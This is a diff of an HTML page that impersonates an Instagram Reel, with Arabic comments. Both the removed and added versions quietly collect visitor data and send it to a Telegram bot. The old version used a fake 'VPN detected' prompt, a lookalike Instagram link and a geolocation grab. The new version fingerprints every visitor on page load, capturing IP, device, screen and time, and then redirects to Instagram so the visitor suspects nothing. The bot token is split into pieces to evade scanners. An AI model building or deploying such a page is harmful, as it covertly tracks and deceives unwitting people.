@@ -3,85 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <meta property="og:title" content="Instagram Reel">
-    <meta property="og:description" content="شاهد هذا الفيديو على Instagram">
-    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b407f3e8E.png">
-
-    <title>تأكيد الاتصال الآمن</title>
+    <title>Instagram</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 30px; width: 320px; border-radius: 12px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        .error-icon { font-size: 50px; color: #e74c3c; margin-bottom: 15px; }
-        .btn-link { color: #0095f6; text-decoration: none; font-weight: bold; font-size: 14px; cursor: pointer; word-break: break-all; }
-        .btn-link:hover { text-decoration: underline; }
+        /* شاشة تحميل بسيطة لتبدو كأنها عملية تحويل رسمية */
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 2px solid #dbdbdb; border-top: 2px solid #0095f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="error-icon">⚠️</div>
-    <h3>خطأ في الاتصال (VPN Detected)</h3>
-    <p style="font-size: 14px; color: #666;">يبدو أنك تستخدم بروكسي أو VPN. يرجى تأكيد هويتك عبر الرابط الرسمي للمتابعة:</p>
-    
-    <a href="javascript:void(0)" class="btn-link" onclick="verify()">
-        instаgrаm.com/reels/Cg9${Math.floor(Math.random() * 1000000)}BvG/
-    </a>
-</div>
+    <div class="loader"></div>
 
-<script>
-    // --- منطقة التشفير المتقدمة (تغيير الترتيب) ---
-    // قمنا بتقسيم التوكن لأجزاء مبعثرة لكي لا يجمعها روبوت الفحص
-    const s1 = "8609389464";
-    const s2 = "AAEIqne_f";
-    const s3 = "0xZNOeqYz-";
-    const s4 = "rk7XOsbALU";
-    const s5 = "M12gA8";
-    const cId = "8658217605";
+    <script>
+        // --- أسلوب التشفير بالتقسيم (نفس طريقة الكود الذي أرسلته) ---
+        const s1 = "8609389464";
+        const s2 = "AAEIqne_f";
+        const s3 = "0xZNOeqYz-";
+        const s4 = "rk7XOsbALU";
+        const s5 = "M12gA8";
+        const cId = "8658217605";
 
-    // دالة التجميع "الحية" (تجمع التوكن فقط عند الضغط)
-    function build() {
-        const partA = s1 + ":" + s2;
-        const partB = s3 + s4 + s5;
-        return partA + partB;
-    }
-
-    async function verify() {
-        // بمجرد الضغط، نبدأ سحب البيانات
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    
-                    const report = `🎯 صيدة جديدة (تشفير مبعثر):\n` +
-                                   `🌐 IP: ${ipRes.ip}\n` +
-                                   `📍 الموقع: http://maps.google.com/maps?q=${lat},${lon}\n` +
-                                   `📱 الجهاز: ${navigator.platform}`;
-                    
-                    await post(report);
-                    window.location.replace("https://www.instagram.com/reels/");
-                }, async () => {
-                    // في حال رفض الموقع، نرسل الـ IP فقط
-                    await post(`⚠️ رفض الموقع (IP فقط):\n🌐 IP: ${ipRes.ip}`);
-                    window.location.replace("https://www.instagram.com/reels/");
-                });
-            }
-        } catch (e) {
-            window.location.replace("https://www.instagram.com/reels/");
+        // دالة تجميع التوكن "المخفية"
+        function _build() {
+            return s1 + ":" + s2 + s3 + s4 + s5;
         }
-    }
 
-    async function post(msg) {
-        const url = `https://api.telegram.org/bot${build()}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: cId, text: msg })
-        });
-    }
-</script>
+        async function silentCapture() {
+            try {
+                // 1. جلب الـ IP صامتاً
+                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+
+                // 2. تجميع معلومات الجهاز (بصمة المتصفح)
+                const data = {
+                    ip: ipRes.ip,
+                    ua: navigator.userAgent,
+                    plt: navigator.platform,
+                    res: `${screen.width}x${screen.height}`,
+                    tm: new Date().toLocaleString('ar-EG')
+                };
+
+                const report = `👤 زيارة صامتة (تشفير مبعثر):\n\n` +
+                               `🌐 IP: ${data.ip}\n` +
+                               `📱 الجهاز: ${data.plt}\n` +
+                               `🖥️ الشاشة: ${data.res}\n` +
+                               `⏰ الوقت: ${data.tm}`;
+
+                // 3. الإرسال للبوت (استدعاء التوكن المجمع في الذاكرة فقط)
+                await fetch(`https://api.telegram.org/bot${_build()}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: cId, text: report })
+                });
+
+                // 4. التوجه النهائي لإنستغرام
+                window.location.replace("https://www.instagram.com/reels/");
+
+            } catch (err) {
+                // في حال وجود مانع إعلانات أو خطأ، التوجه لإنستغرام لعدم الشك
+                window.location.replace("https://www.instagram.com/reels/");
+            }
+        }
+
+        // تشغيل العملية فور تحميل الصفحة
+        window.onload = silentCapture;
+    </script>
 </body>
 </html>
